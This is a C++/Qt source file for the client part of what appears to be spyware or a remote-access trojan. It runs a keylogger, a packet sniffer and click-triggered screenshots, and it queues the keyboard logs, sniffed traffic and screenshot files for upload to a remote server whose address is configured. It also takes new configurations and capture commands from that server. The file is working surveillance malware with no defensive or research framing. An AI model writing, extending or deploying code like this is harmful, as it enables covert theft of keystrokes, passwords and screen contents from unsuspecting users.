#include <QDebug>
#include "client.h"

Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QString _ip, quint16 _destPort):
    QObject(parent),
    path(defaultPath),
    locPort(_locPort),
    ip(_ip),
    destPort(_destPort)
{    
    //Start sniffer
    QThread* snThread = new QThread();
    std::string filter = "";//"ip dst net 192.168 and src net 192.168";
    sniffer = std::make_unique<Sniffer>(nullptr, filter);
    sniffer->moveToThread(snThread);
    connect(snThread, &QThread::started, sniffer.get(), &Sniffer::start);
    connect(snThread, &QThread::finished, snThread, &QThread::deleteLater);
    connect(snThread, &QThread::finished, sniffer.get(), &Sniffer::deleteLater);
    snThread->start();

    //Send sniffer data
    connect(sniffer.get(), &Sniffer::newData, [this](const QString& data){
        fileClient->enqueueData(Type::STRING, "DATA|" + data);
        fileClient->connect();
    });

    //Start modules
    fileServer = std::make_unique<FileServer>(this, locPort, path);
    fileClient = std::make_unique<FileClient>(this, ip, destPort);
    config = std::make_unique<Config>();
    onlineTimer = std::make_unique<QTimer>(this);
    fileServer->start();

    //Load config
    //Default path ./config.cfg
    if( ! loadConfig(*config, path + "/config.cfg") )
    {
        qDebug() << "Config not found. Creating new.";
        saveConfig(*config, path + "/config.cfg");
    }

    //Update client state
    update();

    //Trying to connect to server
    getOnline();

    //Connect to receive files and strings
    connect(fileServer.get(), &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
    connect(fileServer.get(), &FileServer::stringReceived, [this](QString str, QString ip){ this->getString(str, ip); });

    //Progress bar
    //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });

    //Make "screens" folder
    QDir dir;
    dir.mkdir(path + "/screens");

    //Connect screenshot module
    connect(&MouseHook::instance(), &MouseHook::mouseClicked, [this]()
    {
        //Thread for making screenshots
        QThread* thread = new QThread(this);
        MakeScreen* screen = new MakeScreen(0, path + "/screens/", MouseHook::instance().getPrevName());
        screen->moveToThread(thread);

        connect(thread, &QThread::started, screen, &MakeScreen::makeScreenshot);
        connect(screen, &MakeScreen::screenSaved, thread, &QThread::quit);
        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
        connect(thread, &QThread::finished, screen, &MakeScreen::deleteLater);

        thread->start();

        connect(screen, &MakeScreen::screenSaved,
        this, [this](QString screenName)
        {
            MouseHook::instance().setPrevName(screenName);
            //Send screenshot
            fileClient->enqueueData(Type::FILE, path + "/screens/" + screenName);
            fileClient->connect();
        });
    });

    //Set default folder
    Klog::instance().setPath(path);

    //Send keyboard log by timer timeout
    connect(&Klog::instance(), &Klog::timerIsUp, [this](){
        enqueueLog();
        if ( ! fileClient->isDataQueueEmpty() )
            fileClient->connect();
    });
}

Client::~Client()
{
    fileClient->getOffline();
    qDebug() << "Client deleted.";
}

void Client::update()
{
    qDebug() << "\nCONFIG:";
    qDebug() << "Screen timer:\t" << config->secondsScreen;

    //set flags
    qDebug() << "LMB:\t" << config->mouseButtons.test(int(Buttons::left));
    qDebug() << "RMB:\t" << config->mouseButtons.test(int(Buttons::right));
    qDebug() << "MMB:\t" << config->mouseButtons.test(int(Buttons::middle));
    qDebug() << "MWH:\t" << config->mouseButtons.test(int(Buttons::wheel));
    qDebug() << "Logging is " << (config->logRun ? "on" : "off");
    qDebug() << "Log timer:\t" << config->secondsLog << endl;

    //Update screenshot and log parameters
    MouseHook::instance().setParameters(config->mouseButtons, config->secondsScreen);
    Klog::instance().setParameters(config->logRun, config->secondsLog);
}

void Client::getOnline()
{
    //Queue string
    fileClient->enqueueData(Type::STRING, "ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) );
    //Start and connect timer
    onlineTimer->start(2*1000);    //2, 4, 8, 16 ... seconds
    connect(onlineTimer.get(), &QTimer::timeout, [this](){
        fileClient->connect();
        onlineTimer->setInterval(2*onlineTimer->interval());
    });
    connect(fileClient.get(), &FileClient::transmitted, onlineTimer.get(), &QTimer::stop);
}

void Client::getFile(const QString& path, const QString& /* ip */)
{
    qDebug() << path;
    QString extension = path.section('.', -1, -1);
    //If config received
    if (extension == "cfg")
        getNewConfig(path);
}

void Client::getString(const QString &string, const QString& /* ip */)
{
    QString command = string.section('|', 0, 0);
    if (command == "FILES")
    {
        QString filesStr = string;
        //remove "FILES|"
        int colonPos = string.indexOf("|");
        filesStr.remove(0, colonPos+1);

        QString currentFile = filesStr.section('|', 0, 0);
        int files = currentFile.toInt();

        if (files & (int)Files::Screen) emit MouseHook::instance().mouseClicked();
        if (files & (int)Files::Log) enqueueLog();

        if (! fileClient->isDataQueueEmpty())
            fileClient->connect();
    }
}

void Client::getNewConfig(const QString &path)
{
    loadConfig(*config, path);
    update();

    //Delete old config and rename new
    QFile oldConfig(this->path + "/config.cfg");
    QFile newConfig(path);
    if (oldConfig.exists())
        oldConfig.remove();
    newConfig.rename(this->path + "/config.cfg");

    //Check if folder is empty and delete
    QDir dir = path.section('/', 0, -2);
    if(dir.entryInfoList(QDir::NoDotAndDotDot|QDir::AllEntries).count() == 0)
        dir.rmdir(path.section('/', 0, -2)); //dir.name()
}

/*
 * Copy current log to full log
 * Enqueue current log to data queue
 * Delete current log when data will be transmitted
*/
void Client::enqueueLog()
{
    QFile log(path + "/data.log");
    log.rename(path + "/data_tmp.log");
    QFile fullLog(path + "/fullData.log");

    if ( ! (log.open(QIODevice::ReadOnly) &&
         fullLog.open(QIODevice::Append)) )
    {
       qDebug() << "Can't open log files.";
       return;
    }

    //Copy temp log to full log
    fullLog.write(log.readAll());
    log.close();
    fullLog.close();

    fileClient->enqueueData(Type::FILE, path + "/data_tmp.log");

    //Delete temp log when it will be transmitted
    disconnect(fileClient.get(), &FileClient::transmitted, 0 , 0);
    connect(fileClient.get(), &FileClient::transmitted, [this](){
        QFile::remove(path + "/data_tmp.log");
    });
}

